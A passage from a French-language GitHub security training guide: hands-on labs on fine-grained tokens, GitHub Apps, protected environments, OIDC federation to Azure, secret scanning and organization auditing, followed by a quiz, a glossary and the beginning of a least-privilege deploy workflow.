      <li>Settings → Developer settings → Personal access tokens → <b>Fine-grained tokens</b> → Generate.</li>
      <li>Expiration 7 jours, uniquement <code>lab-github-iam</code>, permissions <code>Contents: Read</code> seulement.</li>
      <li>Testez : <code>GH_TOKEN=github_pat_xxx gh api repos/kevmat242/lab-github-iam/contents/README.md --jq .name</code> fonctionne ; essayez sur un autre dépôt : refusé.</li>
      <li>Essayez de créer un fichier avec ce jeton : refusé (lecture seule). Puis <b>révoquez</b> le jeton et vérifiez qu'il ne marche plus.</li>
    </ol>
  </details>
  <details><summary>TP 6 — Votre première GitHub App (1 h)</summary>
    <ol>
      <li>Créez l'App <code>kevmat242-lab-bot</code> (section GitHub Apps) avec <code>Contents: Read and write</code> et <code>Issues: Read and write</code>, webhook désactivé.</li>
      <li>Générez la clé privée, installez l'App sur <code>lab-github-iam</code> uniquement.</li>
      <li>Dans le dépôt : variable <code>LAB_BOT_APP_ID</code>, secret <code>LAB_BOT_PRIVATE_KEY</code> (contenu du .pem). Supprimez ensuite le .pem de votre PC.</li>
      <li>Workflow manuel qui obtient un jeton avec <code>actions/create-github-app-token</code> et crée une issue : elle apparaît au nom de <code>kevmat242-lab-bot[bot]</code>.</li>
      <li>Rotation : générez une seconde clé, mettez à jour le secret, relancez, puis supprimez l'ancienne clé.</li>
    </ol>
  </details>
  <details><summary>TP 7 — Workflow sécurisé et environnement protégé (1 h)</summary>
    <ol>
      <li>Ajoutez le workflow <code>ci.yml</code> de la section Actions (permissions minimales, action épinglée par SHA).</li>
      <li>Settings → Environments → <b>New environment</b> <code>prod</code> : Required reviewers = vous, branches autorisées = <code>main</code>.</li>
      <li>Ajoutez un secret d'environnement <code>DEMO_SECRET</code> et un job <code>environment: prod</code> qui affiche <code>echo "longueur: ${#DEMO_SECRET}"</code>.</li>
      <li>Constatez : le job attend votre approbation, et le secret est masqué (<code>***</code>) dans les journaux.</li>
      <li>Ajoutez <code>.github/dependabot.yml</code> pour <code>github-actions</code>.</li>
    </ol>
  </details>
  <details><summary>TP 8 — OIDC vers Azure, sans aucun secret (1 h 30)</summary>
    <ol>
      <li>Prérequis : un abonnement Azure personnel (compte gratuit), jamais le tenant de l'entreprise.</li>
      <li>Dépôt <code>lab-oidc</code>, environnement <code>prod</code> protégé.</li>
      <li>Entra ID : App registration <code>gh-lab-oidc</code>, <b>federated credential</b> GitHub Actions → <code>kevmat242/lab-oidc</code>, Environment <code>prod</code>. Rôle <code>Reader</code> sur un groupe de ressources de test.</li>
      <li>Workflow <code>azure.yml</code> de la section OIDC : <code>az group list</code> fonctionne.</li>
      <li>Expérience de sécurité : retirez <code>environment: prod</code> du job et relancez. L'authentification doit <b>échouer</b> (<code>AADSTS700213</code> : aucune federated credential ne correspond au <code>sub</code>). Vous venez de vérifier que la confiance est bien limitée.</li>
      <li>Ajoutez une étape qui affiche les claims (sans la signature) pour les observer :
        <div class="code"><pre>- <span class="k">run:</span> |
    TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&amp;audience=api://AzureADTokenExchange" | jq -r .value)
    echo "$TOKEN" | cut -d. -f2 | python3 -c 'import sys,base64,json
s=sys.stdin.read().strip(); s+="="*(-len(s)%4)
c=json.loads(base64.urlsafe_b64decode(s))
print(json.dumps({k:c.get(k) for k in ("sub","repository","repository_id","environment","ref")}, indent=2))'</pre></div></li>
    </ol>
  </details>
  <details><summary>TP 9 — Secret scanning et push protection (30 min)</summary>
    <ol>
      <li>Sur un dépôt <b>public</b> de test : Settings → Code security → vérifiez que Secret scanning et Push protection sont actifs.</li>
      <li>Lisez la liste des motifs détectés dans la doc (« Supported secret scanning patterns »).</li>
      <li>Reprenez le TP 5 : générez un PAT de test, essayez de le commiter dans un fichier et de pousser. Le push doit être <b>bloqué</b>. Ne contournez pas : retirez le fichier (<code>git reset --soft HEAD~1</code>), puis <b>révoquez</b> le jeton.</li>
    </ol>
  </details>
  <details><summary>TP 10 — Inventaire et audit (1 h)</summary>
    <ol>
      <li>Créez une organisation gratuite <code>kevmat242-lab</code> (Settings → Organizations → New organization, offre Free).</li>
      <li>Transférez-y <code>lab-github-iam</code>, créez une équipe <code>iam-devs</code> avec le rôle Write sur le dépôt, et réglez la base permission à <code>No permission</code>.</li>
      <li>Installez votre App sur l'organisation, créez un PAT fine-grained ciblant l'organisation et approuvez-le.</li>
      <li>Lancez les commandes d'inventaire de la section Audit, puis consultez le journal d'audit de l'organisation et retrouvez chaque action que vous avez faite.</li>
      <li>Bonus : un workflow planifié chaque lundi qui produit ce rapport en fichier CSV dans les artefacts du run.</li>
    </ol>
  </details>
</section>

<section id="quiz" data-group="Pratiquer" data-title="Quiz d'auto-évaluation">
  <div class="eyebrow">Validation des acquis</div>
  <h2>Quiz d'auto-évaluation</h2>
  <details><summary>Quelle est la différence entre Git et GitHub ?</summary><p>Git est le logiciel de gestion de versions, local ; GitHub est la plateforme qui héberge les dépôts et ajoute collaboration, automatisation et contrôle d'accès.</p></details>
  <details><summary>Que fait <code>git add</code> ?</summary><p>Il place des modifications dans l'index : elles feront partie du prochain commit.</p></details>
  <details><summary>Merge ou rebase sur main ?</summary><p>Merge (ou une PR) : on ne réécrit jamais l'historique d'une branche partagée. Le rebase est réservé à votre branche personnelle.</p></details>
  <details><summary>Vous avez poussé un mot de passe. Première action ?</summary><p>Le révoquer et le remplacer immédiatement. Le nettoyage de l'historique vient après.</p></details>
  <details><summary>Pourquoi l'auteur d'un commit ne prouve-t-il rien ?</summary><p>Parce que <code>user.name</code> et <code>user.email</code> sont libres. Seule une signature vérifiée prouve l'auteur.</p></details>
  <details><summary>Quelle identité choisir pour un outil qui gère plusieurs dépôts ?</summary><p>Une GitHub App : liée à aucune personne, permissions fines, jetons d'une heure, actions attribuées au bot dans l'audit.</p></details>
  <details><summary>Pourquoi éviter les PAT classiques ?</summary><p>Ils peuvent ne jamais expirer, donnent accès à tout ce que la personne voit avec des scopes larges, et restent liés à un salarié qui peut partir.</p></details>
  <details><summary>Que contient le <code>sub</code> d'un jeton OIDC GitHub ?</summary><p>L'identité du demandeur, par exemple <code>repo:OWNER/REPO:environment:prod</code> ou <code>repo:OWNER/REPO:ref:refs/heads/main</code>.</p></details>
  <details><summary>Quelle permission un job doit-il avoir pour utiliser OIDC ?</summary><p><code>id-token: write</code>.</p></details>
  <details><summary>Pourquoi épingler une action par SHA ?</summary><p>Un tag comme <code>@v4</code> peut être déplacé vers du code malveillant ; un SHA complet désigne un contenu immuable.</p></details>
  <details><summary>Quel est le danger de <code>pull_request_target</code> ?</summary><p>Il s'exécute avec les secrets et un jeton en écriture même pour une PR venant d'un fork ; exécuter le code de la PR dans ce contexte donne ces accès à un attaquant.</p></details>
  <details><summary>Quelle différence entre SAML SSO et EMU ?</summary><p>Avec SAML SSO, la personne possède son compte et passe par l'IdP pour accéder à l'organisation. Avec EMU, les comptes sont créés et supprimés par l'IdP : l'entreprise les possède.</p></details>
  <details><summary>Où donner les droits : à une personne ou à une équipe ?</summary><p>À une équipe, idéalement synchronisée avec un groupe Entra ID géré par l'IGA.</p></details>
</section>

<section id="glossaire" data-group="Référence" data-title="Glossaire">
  <div class="eyebrow">Référence</div>
  <h2>Glossaire</h2>
  <dl class="kv">
    <dt>Branch</dt><dd>Étiquette mobile pointant sur un commit.</dd>
    <dt>CODEOWNERS</dt><dd>Fichier qui désigne les relecteurs obligatoires par chemin.</dd>
    <dt>Commit</dt><dd>Version enregistrée du projet, identifiée par un SHA.</dd>
    <dt>Deploy key</dt><dd>Clé SSH liée à un seul dépôt.</dd>
    <dt>EMU</dt><dd>Enterprise Managed Users : comptes gérés par l'IdP.</dd>
    <dt>Environment</dt><dd>Cible de déploiement avec secrets et règles d'approbation.</dd>
    <dt>Fork</dt><dd>Copie d'un dépôt sous un autre compte.</dd>
    <dt>GitHub App</dt><dd>Identité machine de référence sur GitHub.</dd>
    <dt>GITHUB_TOKEN</dt><dd>Jeton automatique d'un run de workflow.</dd>
    <dt>IdP</dt><dd>Fournisseur d'identité (Entra ID, Okta…).</dd>
    <dt>Merge</dt><dd>Fusion de deux branches.</dd>
    <dt>OIDC</dt><dd>OpenID Connect : fédération d'identité par jetons signés.</dd>
    <dt>PAT</dt><dd>Personal Access Token, classique ou fine-grained.</dd>
    <dt>Pull request</dt><dd>Demande de fusion avec revue et contrôles.</dd>
    <dt>Push protection</dt><dd>Blocage d'un push contenant un secret.</dd>
    <dt>Rebase</dt><dd>Rejouer des commits sur une autre base.</dd>
    <dt>Ruleset</dt><dd>Ensemble de règles de protection de branches ou tags.</dd>
    <dt>Runner</dt><dd>Machine qui exécute les jobs Actions.</dd>
    <dt>SCIM</dt><dd>Protocole de provisionnement automatique des comptes.</dd>
    <dt>SHA</dt><dd>Empreinte unique d'un commit.</dd>
    <dt>SSO SAML</dt><dd>Authentification déléguée à l'IdP.</dd>
    <dt>Workflow</dt><dd>Fichier YAML d'automatisation GitHub Actions.</dd>
  </dl>
</section>

  <div class="code"><pre><span class="k">name:</span> Déploiement
<span class="k">on:</span>
  <span class="k">push:</span>
    <span class="k">branches:</span> [main]
<span class="k">permissions:</span>
  <span class="k">contents:</span> read
<span class="k">concurrency:</span> deploy-prod
<span class="k">jobs:</span>
  <span class="k">deploy:</span>
    <span class="k">runs-on:</span> ubuntu-latest
    <span class="k">environment:</span> prod            <span class="c"># approbation + secrets de prod</span>
    <span class="k">permissions:</span>
      <span class="k">contents:</span> read
      <span class="k">id-token:</span> write            <span class="c"># OIDC</span>
    <span class="k">timeout-minutes:</span> 20
    <span class="k">steps:</span>
      - <span class="k">uses:</span> actions/checkout@&lt;SHA&gt;   <span class="c"># épinglé</span>
